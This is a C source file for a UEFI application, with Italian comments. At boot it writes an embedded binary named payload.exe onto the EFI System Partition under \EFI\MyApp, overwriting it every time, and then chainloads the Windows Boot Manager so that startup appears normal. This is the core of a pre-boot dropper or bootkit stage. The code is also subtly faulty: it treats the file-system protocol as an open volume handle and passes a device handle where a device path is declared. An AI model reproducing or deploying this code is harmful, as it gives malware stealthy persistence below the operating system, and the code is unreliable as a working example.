#include <efi.h>
#include <efilib.h>
#include "payload.h"

/* Scrive un buffer in un file sulla ESP (crea o sovrascrive) */
static EFI_STATUS
esp_write_file(EFI_FILE_HANDLE Root, CHAR16 *Path, void *Data, UINTN Size)
{
    EFI_STATUS      Status;
    EFI_FILE_HANDLE File;
    UINTN           Written = Size;

    Status = uefi_call_wrapper(
        Root->Open, 5, Root, &File, Path,
        EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_CREATE, 0);
    if (EFI_ERROR(Status)) return Status;

    Status = uefi_call_wrapper(File->Write, 3, File, &Written, Data);
    uefi_call_wrapper(File->Close, 1, File);
    return Status;
}

/* Crea la directory se non esiste (ignora errori se già c'è) */
static void
esp_mkdir(EFI_FILE_HANDLE Root, CHAR16 *Path)
{
    EFI_FILE_HANDLE Dir;
    EFI_STATUS s = uefi_call_wrapper(
        Root->Open, 5, Root, &Dir, Path,
        EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_CREATE,
        EFI_FILE_DIRECTORY);
    if (!EFI_ERROR(s)) uefi_call_wrapper(Dir->Close, 1, Dir);
}

/* Carica e avvia bootmgfw.efi */
static EFI_STATUS
chainload_windows(EFI_HANDLE Image, EFI_SYSTEM_TABLE *ST, EFI_DEVICE_PATH *ESP_DevPath)
{
    EFI_STATUS      Status;
    EFI_DEVICE_PATH *DP;
    EFI_HANDLE      BMHandle;

    DP = FileDevicePath(ESP_DevPath, L"\\EFI\\Microsoft\\Boot\\bootmgfw.efi");
    if (DP == NULL) return EFI_NOT_FOUND;

    Status = uefi_call_wrapper(
        ST->BootServices->LoadImage, 6,
        FALSE, Image, DP, NULL, 0, &BMHandle);
    FreePool(DP);
    if (EFI_ERROR(Status)) return Status;

    return uefi_call_wrapper(
        ST->BootServices->StartImage, 3, BMHandle, NULL, NULL);
}

EFI_STATUS EFIAPI
efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    EFI_STATUS        Status;
    EFI_LOADED_IMAGE *LoadedImage;
    EFI_FILE_HANDLE   Root;

    InitializeLib(ImageHandle, SystemTable);
    Print(L"[efi_stage] avvio\r\n");

    /* 1. Recupera l'immagine caricata per conoscere il device */
    Status = uefi_call_wrapper(
        SystemTable->BootServices->HandleProtocol, 3,
        ImageHandle, &LoadedImageProtocol, (void **)&LoadedImage);
    if (EFI_ERROR(Status)) return Status;

    /* 2. Apri la radice del filesystem (la ESP) */
    Status = uefi_call_wrapper(
        SystemTable->BootServices->HandleProtocol, 3,
        LoadedImage->DeviceHandle, &FileSystemProtocol, (void **)&Root);
    if (EFI_ERROR(Status)) return Status;

    /* 3. Crea \EFI\MyApp\ */
    esp_mkdir(Root, L"\\EFI\\MyApp");

    /* 4. Scrivi payload.exe (sovrascrive sempre) */
    Status = esp_write_file(
        Root, L"\\EFI\\MyApp\\payload.exe",
        payload_data, payload_len);
    if (EFI_ERROR(Status)) {
        Print(L"[efi_stage] scrittura payload.exe fallita: %r\r\n", Status);
    } else {
        Print(L"[efi_stage] payload.exe scritto (%d byte)\r\n", payload_len);
    }

    /* 5. Avvia Windows */
    Print(L"[efi_stage] avvio Windows Boot Manager...\r\n");
    Status = chainload_windows(ImageHandle, SystemTable, LoadedImage->DeviceHandle);
    Print(L"[efi_stage] StartImage è ritornato: %r\r\n", Status);
    return Status;
}